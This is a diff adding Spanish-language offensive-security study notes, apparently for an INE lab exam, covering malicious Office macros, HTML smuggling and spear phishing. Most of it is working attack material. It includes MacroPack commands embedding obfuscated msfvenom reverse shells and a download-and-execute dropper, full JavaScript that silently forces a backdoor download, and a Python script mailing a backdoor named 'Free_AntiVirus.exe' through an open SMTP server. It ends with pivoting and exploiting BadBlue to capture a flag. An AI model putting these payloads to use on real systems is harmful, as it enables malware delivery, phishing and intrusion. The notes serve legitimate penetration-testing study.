@@ -825,14 +825,243 @@ netstat -antp    # verificar que apache está escuchando en puerto 80
 # - mshta.exe es un binario legítimo — evade application whitelisting
 ```
 
-#### HTA Attacks
-
-```bash
-```
 #### Automating Macro Development with MacroPack
 
 ```bash
+# Qué es MacroPack
+# Herramienta open source en Python 3 para automatizar desarrollo de macros
+# Ofusca automáticamente para evadir AV
+# Soporta múltiples formatos: .doc, .docm, .xls, .xlsm, .hta, .vba, etc.
+
+# Comandos básicos
+.\macro_pack.exe --help
+.\macro_pack.exe --listformats      # ver formatos soportados
+.\macro_pack.exe --listtemplates    # ver templates disponibles
+
+# Ejemplo 1 — Macro simple que ejecuta un comando
+echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc"
+# -t CMD   — template de tipo comando
+# -o       — ofuscar la macro generada
+# -G       — generar el archivo de salida
+
+# Ejemplo 2 — Combinar msfvenom con MacroPack
+msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<ip_kali> -f vba | \
+    .\macro_pack.exe -o -G "resume.doc"
+# msfvenom genera el payload en formato vba
+# MacroPack lo ofusca y lo embebe en el .doc automáticamente
+
+# Listener en Metasploit
+msfconsole.bat
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip_kali>
+run
+
+# Servir el documento y obtener sesión
+# Desde Windows donde está el doc:
+python -m http.server 80
+# Víctima descarga y abre el doc → sesión Meterpreter en Kali
+
+# Ejemplo 3 — Dropper con MacroPack
+# Genera un doc que descarga y ejecuta un payload desde un servidor
+echo "http://<ip_kali>/update.exe" "update.exe" | \
+    macro_pack.exe -t DROPPER -o -G "Accounts2022.xls"
+# -t DROPPER — template dropper, descarga y ejecuta el payload
+# El .xls generado descarga update.exe desde tu servidor y lo ejecuta
+
+# Flujo dropper completo
+# 1. Generar payload: msfvenom → update.exe
+# 2. Servir: python -m http.server 80
+# 3. Generar doc dropper con MacroPack
+# 4. Víctima abre el .xls → descarga update.exe → ejecuta → sesión Meterpreter
+
+# Ventaja de MacroPack vs manual
+# - Ofuscación automática — evade AV sin trabajo extra
+# - Un solo comando genera el doc listo para usar
+# - Soporta múltiples formatos de Office
 ```
+
+### ~ Delivery & Execution
+
+#### File Smuggling with HTML & JavaScript
+
+```bash
+# Qué es HTML Smuggling
+# Técnica para entregar payloads bypaseando filtros de red, firewalls y email gateways
+# El payload viaja embebido en Base64 dentro del HTML — no como archivo adjunto
+# El browser reconstruye y descarga el archivo en el lado del cliente
+# Los filtros de red ven HTML/JS inofensivo, no un .exe
+
+# Flujo completo
+# 1. Generar payload .exe con msfvenom
+# 2. Convertir a Base64
+# 3. Embeber el Base64 en el HTML
+# 4. Servir el HTML via Apache
+# 5. Víctima visita la página → browser descarga el .exe automáticamente
+# 6. Víctima ejecuta el .exe → sesión Meterpreter en Kali
+
+# Paso 1 — Generar payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_kali> LPORT=4444 -f exe > backdoor.exe
+
+# Paso 2 — Convertir a Base64
+base64 -w0 backdoor.exe > base64.txt
+# -w0 — sin saltos de línea, todo en una sola línea
+
+# Paso 3 — Crear el HTML con el payload embebido
+cd /var/www/html
+rm *.html
+
+vim index.html
+# Contenido:
+<html>
+<body>
+<script>
+function base64ToArrayBuffer(base64) {
+    var binary_string = window.atob(base64);  // decodifica Base64
+    var len = binary_string.length;
+    var bytes = new Uint8Array(len);
+    for (var i = 0; i < len; i++) {
+        bytes[i] = binary_string.charCodeAt(i);
+    }
+    return bytes.buffer;
+}
+
+var file = '<pegar aqui el contenido de base64.txt>';
+var data = base64ToArrayBuffer(file);
+var blob = new Blob([data], {type: 'octet/stream'});  // reconstruye el .exe
+var fileName = 'msfstaged.exe';
+
+// crear link invisible y hacer click automatico para forzar la descarga
+var a = document.createElement('a');
+document.body.appendChild(a);
+a.style = 'display: none';
+var url = window.URL.createObjectURL(blob);
+a.href = url;
+a.download = fileName;
+a.click();                              // descarga automatica al visitar la pagina
+window.URL.revokeObjectURL(url);
+</script>
+</body>
+</html>
+
+# Paso 4 — Servir y obtener sesión
+service apache2 start
+# Configurar listener en Metasploit (use exploit/multi/handler)
+# Víctima visita http://<ip_kali> → descarga msfstaged.exe → ejecuta → sesión
+
+# Por qué bypasea filtros
+# - El payload no viaja como .exe adjunto sino como texto Base64 dentro de HTML
+# - El browser lo reconstruye localmente — el tráfico de red parece HTML normal
+# - Los email gateways y proxies no detectan el payload embebido
+```
+#### Access Via Spear Phishing Attachment
+
+```bash
+# Escenario
+# demo.ine.local  (10.4.25.189) — acceso directo, puerto 25 SMTP abierto
+# demo1.ine.local (10.4.31.237) — máquina interna, solo accesible via pivoting
+# Objetivo: enviar backdoor por email a bob@ine.local y pivotar a demo1
+
+# Paso 1 — Reconocimiento
+nmap -sS -Pn -F demo.ine.local          # escaneo rápido, encontramos puerto 25
+nmap -sV -p 25 demo.ine.local           # verificar servicio SMTP
+
+# Paso 2 — Generar payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_kali> LPORT=4444 -f exe > backdoor.exe
+
+# Paso 3 — Listener
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <ip_kali>
+run
+
+# Paso 4 — Script Python para enviar el email con el backdoor adjunto
+# El servidor SMTP está abierto y no requiere autenticación — misconfiguration común
+nano send_email.py
+# Ver script completo abajo
+python3 send_email.py
+
+# send_email.py
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+fromaddr = "attacker@fake.net"
+toaddr = "bob@ine.local"
+
+msg = MIMEMultipart()
+msg['From'] = fromaddr
+msg['To'] = toaddr
+msg['Subject'] = "Subject of the Mail"
+
+body = "Body_of_the_mail"
+msg.attach(MIMEText(body, 'plain'))
+
+# Adjuntar el backdoor con nombre inofensivo
+filename = "Free_AntiVirus.exe"     # nombre de ingeniería social
+attachment = open("/root/backdoor.exe", "rb")
+
+p = MIMEBase('application', 'octet-stream')
+p.set_payload((attachment).read())
+encoders.encode_base64(p)
+p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+msg.attach(p)
+
+# Enviar via SMTP sin autenticación
+s = smtplib.SMTP('demo.ine.local', 25)
+text = msg.as_string()
+s.sendmail(fromaddr, toaddr, text)
+s.quit()
+
+# Paso 5 — Pivoting a demo1.ine.local
+# Una vez obtenida la sesión Meterpreter en demo:
+shell
+ping 10.4.31.237                    # verificar que demo puede llegar a demo1
+run autoroute -s 10.4.31.237/20    # agregar ruta via sesión activa
+bg
+
+# Configurar proxy SOCKS para tunelizar tráfico
+cat /etc/proxychains4.conf          # verificar puerto y versión
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 4a
+exploit
+
+# Escanear demo1 a través del proxy
+proxychains nmap demo1.ine.local -sT -Pn -p 1-100   # puerto 80 abierto
+
+# Port forwarding para acceder al puerto 80 de demo1 desde Kali
+sessions -i 1
+portfwd add -l 1234 -p 80 -r 10.4.31.237
+portfwd list
+nmap -sV -p 1234 localhost          # identificamos BadBlue 2.7
+
+# Paso 6 — Explotar BadBlue en demo1
+searchsploit badblue 2.7
+bg
+search badblue
+use exploit/windows/http/badblue_passthru
+set RHOSTS demo1.ine.local
+set PAYLOAD windows/meterpreter/bind_tcp
+exploit
+
+# Paso 7 — Flag
+shell
+dir C:\
+type C:\FLAG1.txt
+
+# Puntos clave para el examen
+# - SMTP abierto sin auth = podemos enviar emails como cualquier remitente
+# - Nombre del adjunto es ingeniería social — "Free_AntiVirus.exe"
+# - autoroute + socks_proxy = pivoting completo via sesión Meterpreter
+# - portfwd permite escanear puertos internos directamente desde Kali
+# - bind_tcp en vez de reverse_tcp porque la red interna no puede conectar a Kali
+```
+
+
 ## 03 - Web Application Penetration Testing
 ## 04 - Network Penetration Testing
 ## 05 - System Security & x86 Assembly Fundamentals
